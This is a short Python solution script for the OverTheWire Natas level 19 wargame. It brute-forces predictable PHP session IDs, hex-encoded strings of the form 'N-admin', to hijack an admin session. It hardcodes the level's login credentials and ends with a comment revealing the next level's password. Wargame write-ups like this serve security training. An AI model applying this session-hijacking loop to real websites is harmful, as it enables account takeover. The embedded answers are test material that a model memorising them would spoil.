import requests
import  binascii


username = "natas19"
password = "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs"


url = str("http://%s.natas.labs.overthewire.org/" % username)
for i in range(641):
    s=requests.Session()
    cookie=dict(PHPSESSID=(str(i)+'-admin').encode("utf-8").hex())
    print(cookie)
    r = s.post(url,cookies=cookie,auth=(username, password))
    if r.text.find('You are logged in as a regular user')!=-1:
        print('regular user....',i)
    else:
        print("you are an admin ")
        print(r.text)
        break




# the password natas20 : eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF
